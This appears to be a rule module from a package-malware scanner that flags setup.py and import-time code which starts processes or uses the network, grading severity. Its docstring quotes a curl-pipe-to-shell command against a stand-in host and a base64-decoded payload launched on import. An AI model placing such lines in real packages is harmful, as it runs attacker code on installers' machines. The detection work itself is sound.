"""Code that starts programs or uses the network, by when it runs. Three rules:

install_time_code: `pip install` of an sdist runs its setup.py, and with it every
module setup.py imports from the sdist, before the victim has even looked at the
package:

    os.system("curl evil.example | sh")              # in setup.py, or a module it imports

import_time_code: the way into a real, trusted package once its account or build is
compromised. A few lines added to its __init__.py run on every `import pkg`:

    subprocess.Popen([sys.executable, "-c", base64.b64decode("aW1wb3J0IG9z...")])

unimported_script_code: a module nothing imports runs only when someone runs it.
Plenty of honest packages ship these (a Streamlit app, a launcher), but so does
malware whose payload waits for the user, or whose author got the import wrong
(`bytedtrace/__init__py.py`, a typo for __init__.py).

Severity, by what the calls do:

                              one kind (process    both kinds   a process run with decoded
                              or network)                       or downloaded data
    install_time_code         medium               high         critical
    import_time_code          high                 critical     critical
    unimported_script_code    medium               medium       medium

Honest setup.py files run build tools (`git describe` for a version, `cargo build`),
so one kind is only medium at install time. Honest libraries almost never start
programs or make requests just because they were imported, and a compromised
library has nothing else wrong with it (an old project, real links), so that has
to be suspicious on its own.

Which code counts:
- setup.py: every call, not only its top level, since setuptools also runs the
  methods of custom install commands.
- Every other file: the code that runs on import (calls with import_time_only), in
  the files the import graph reaches: from setup.py (install time, in the sdist), or
  from the package's roots (import time, in the wheel if there is one, since that's
  what gets installed). The package's other files are unimported_script_code's.

Network means calls that connect somewhere (NETWORK_REQUESTS), not all of a network
module: code builds settings like httpx.Timeout(...), which sends nothing. Not
followed: imports by a computed name (importlib.import_module(name)), files run
without an import (exec(open("pkg/version.py").read())), and calls into functions
of other files.
"""

from __future__ import annotations

from typing import Any

from crotalus.models import AnalysisContext, Finding, Severity
from crotalus.rules.helpers.import_graph import (
    installed_package_code,
    modules_run_on_import,
    modules_run_on_install,
)
from crotalus.rules.helpers.static_code_analysis import (
    calls,
    dangerous_behaviour,
    origins,
    read,
    snippet,
)

# rule_id -> what was happening (for the message), then the severity for: one kind of
# call, both kinds, a process run with decoded or downloaded data.
RULE_SETTINGS: dict[str, tuple[str, Severity, Severity, Severity]] = {
    "install_time_code": ("installing the package", "medium", "high", "critical"),
    "import_time_code": ("importing the package", "high", "critical", "critical"),
    "unimported_script_code": ("running a module nothing imports", "medium", "medium", "medium"),
}


def check(context: AnalysisContext) -> list[Finding]:
    findings = []
    # Install time: the sdist's setup.py and the modules it imports.
    if context.sdist is not None:
        sdist_files = context.sdist.python_files
        run_on_install = modules_run_on_install(sdist_files)
        findings += _check_files(
            "install_time_code", "sdist", {path: sdist_files[path] for path in run_on_install}
        )
    # Import time: the files the import graph reaches, in the wheel if there is one.
    # The package's other files only run when someone runs them.
    package_code = installed_package_code(context)
    if package_code is not None:
        distribution, files = package_code
        run_on_import = modules_run_on_import(files)
        findings += _check_files(
            "import_time_code", distribution, {path: files[path] for path in run_on_import}
        )
        findings += _check_files(
            "unimported_script_code",
            distribution,
            {path: files[path] for path in files.keys() - run_on_import},
        )
    return findings


def _check_files(rule_id: str, distribution: str, files: dict[str, str]) -> list[Finding]:
    """The rule's finding about the calls in `files` that start programs or connect to
    the network: [] if there are none.
    """
    # One file at a time (parse trees are many times the size of the source).
    calls_found: list[dict[str, Any]] = []
    for path, file_contents in sorted(files.items()):
        py_file = read(file_contents)
        if py_file is None:
            continue
        # setuptools also runs the methods of setup.py's custom commands: all its calls count.
        import_time_only = not (rule_id == "install_time_code" and path == "setup.py")
        file_calls = calls(py_file, import_time_only=import_time_only)
        for call_name, call_node in sorted(file_calls, key=lambda c: c[1].lineno):
            behaviour = dangerous_behaviour(call_name)
            if behaviour not in ("starts_process", "network_request"):
                continue
            arguments = [*call_node.args, *(kw.value for kw in call_node.keywords)]
            calls_found.append(
                {
                    "file": path,
                    "call": call_name,
                    "line": call_node.lineno,
                    "snippet": snippet(py_file, call_node),
                    "behaviour": behaviour,
                    "runs_decoded_or_downloaded_data": behaviour == "starts_process"
                    and any(origins(argument, py_file) for argument in arguments),
                }
            )
    if not calls_found:
        return []

    behaviours = {c["behaviour"] for c in calls_found}
    when, one_kind, both_kinds, hidden_data = RULE_SETTINGS[rule_id]
    if any(c["runs_decoded_or_downloaded_data"] for c in calls_found):
        severity = hidden_data
    elif len(behaviours) == 2:
        severity = both_kinds
    else:
        severity = one_kind

    does = []
    if "starts_process" in behaviours:
        does.append("starts programs")
    if "network_request" in behaviours:
        does.append("uses the network")
    flagged_files = sorted({c["file"] for c in calls_found})
    return [
        Finding(
            rule_id=rule_id,
            severity=severity,
            message=f"{when} {' and '.join(does)} ({', '.join(flagged_files[:3])})",
            evidence={
                "distribution": distribution,
                "calls": calls_found[:10],  # the first few is enough to see what it does
                "total_calls": len(calls_found),
            },
        )
    ]
